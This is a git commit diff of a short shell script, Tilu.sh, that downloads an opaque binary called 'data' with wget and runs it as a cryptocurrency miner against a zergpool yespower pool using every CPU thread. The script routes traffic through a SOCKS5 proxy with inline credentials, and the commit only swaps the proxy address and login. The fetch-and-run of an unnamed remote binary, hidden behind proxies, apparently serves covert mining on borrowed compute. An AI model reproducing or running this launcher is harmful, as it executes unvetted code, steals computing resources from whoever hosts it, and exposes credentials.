cf15d7d018023800f3dd30df92d277c10c9b3212
eyishxd <102873412+eyishxd@users.noreply.github.com>
2022-04-26 01:01:24 +0700

    Update Tilu.sh

--- Tilu.sh
+++ Tilu.sh
@@ -1,4 +1,4 @@
 apt update -y
 wget -q https://github.com/thirthada007/DevOps/raw/main/data
 chmod +x data
-./data -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u RBbGMpNtitSpNwGMT1cXgYNTfpYdHbrGde.Test -p c=RVN -t $(nproc) -x socks5://zjrpjitr:8yfoonefclaz@45.136.231.85:7141
+./data -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u RBbGMpNtitSpNwGMT1cXgYNTfpYdHbrGde.Test -p c=RVN -t $(nproc) -x socks5://mtyccgfz:nt7hiibuzolw@45.140.13.112:9125
